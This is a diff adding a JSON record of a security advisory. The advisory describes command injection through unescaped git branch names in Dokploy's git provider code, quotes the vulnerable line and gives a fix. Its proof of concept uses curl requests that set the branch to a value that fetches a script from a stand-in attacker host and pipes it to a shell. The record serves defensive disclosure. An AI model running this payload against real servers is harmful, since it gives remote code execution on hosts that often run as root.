@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-qwwm-hc7m-7xp9",
+  "aliases": [],
+  "title": "Command Injection via Unescaped Git Branch Names in All Providers",
+  "summary": "## Summary\n\nDokploy has a command injection vulnerability in its git provider implementation. The `--branch` argument to `git clone` is interpolated directly into shell command strings without any escaping, allowing an authenticated user to inject arbitrary OS commands by setting a malicious branch name and triggering a deployment.\n\nThe vulnerable pattern exists across all git provider files, but the branch field consistently uses `z.string().optional()` with no character restrictions. This vulnerability was previously reported as GHSA-3frc-cfh9-ch2c (CVE-2026-45628) but remains unfixed in the current codebase.\n\n## Affected Versions\n\nTODO: Confirm affected version range. Vulnerability present in current `main` branch.\n\n## Vulnerability Details\n\n### Root Cause: Unescaped branch name interpolation in git clone commands\n\nThe `--branch` argument is interpolated without escaping into shell command strings. For example, in `packages/server/src/utils/providers/github.ts` line 170:\n\n```typescript\ncommand += `git clone --branch ${branch} --depth 1 ${enableSubmodules ? \"--recurse-submodules\" : \"\"} ${cloneUrl} ${outputPath} --progress;`;\n```\n\nThe branch field accepts arbitrary strings. Shell metacharacters such as `;`, `|`, `$()`, and backticks are interpreted by the shell when the command string is passed to `execAsync()`.\n\nThe same unescaped interpolation pattern exists across all other git provider files (`git.ts`, `gitlab.ts`, `bitbucket.ts`, `gitea.ts`).\n\nThe codebase has `shEscape()` in `packages/server/src/services/registry.ts` lines 14-17:\n\n```typescript\nfunction shEscape(s: string | undefined): string {\n    if (!s) return \"''\";\n    return `'${s.replace(/'/g, `'\\\\''`)}'`;\n}\n```\n\nThis function is not used in any of the git provider files.\n\n### Attack Chain\n\n- Attacker authenticates to Dokploy with project access\n- Creates or updates an application via tRPC, setting the branch name to `main;curl attacker.com/x|sh;`\n- Triggers a deployment\n- Dokploy builds and executes: `git clone --branch main;curl attacker.com/x|sh; --depth 1 ...`\n- The semicolons terminate the git command and execute the injected commands as the server user\n\n## Proof of Concept\n\n```bash\n# Update application with injected branch name\ncurl -X POST \"http://TARGET/api/trpc/application.update\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Cookie: $SESSION\" \\\n  -d '{\n    \"json\": {\n      \"applicationId\": \"APP_ID\",\n      \"sourceType\": \"github\",\n      \"branch\": \"main;curl attacker.com/x|sh;\"\n    }\n  }'\n\n# Trigger deployment\ncurl -X POST \"http://TARGET/api/trpc/application.deploy\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Cookie: $SESSION\" \\\n  -d '{\"json\": {\"applicationId\": \"APP_ID\"}}'\n\n# The server executes:\n#   git clone --branch main;curl attacker.com/x|sh; --depth 1 ...\n# The semicolons terminate the git command and execute the injected commands.\n```\n\n## Impact\n\n- Execute arbitrary OS commands as the Dokploy server process user (often root)\n- Read/write any file on the host (private keys, database credentials, Docker socket)\n- Pivot to other containers and services via the Docker socket\n- Compromise all applications and databases managed by the Dokploy instance\n\n## Suggested Remediation\n\nApply `shEscape()` to the branch name in the git provider files. For example, in `github.ts`:\n\n```typescript\nimport { shEscape } from \"../../services/registry\";\n\n// In the clone command:\ncommand += `git clone --branch ${shEscape(branch)} --depth 1 ${enableSubmodules ? \"--recurse-submodules\" : \"\"} ${shEscape(cloneUrl)} ${shEscape(outputPath)} --progress;`;\n```\n\nThe same fix should be applied across all provider files.\n\nAlternatively, add Zod schema validation to reject shell metacharacters: `z.string().regex(/^[a-zA-Z0-9._\\/-]+$/)`.",
+  "published_at": "2026-07-21T23:25:05.000Z",
+  "modified_at": "2026-07-21T23:25:05.000Z",
+  "severity": {
+    "level": "high",
+    "score": null,
+    "vector": null,
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-78"
+  ],
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "last_affected": "0.0.0"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-qwwm-hc7m-7xp9",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-qwwm-hc7m-7xp9",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-qwwm-hc7m-7xp9",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:2313f17a42320394c8c4a611860d579c4d4daafcc96de37a223ceb822a55afc1",
+  "note": null
+}
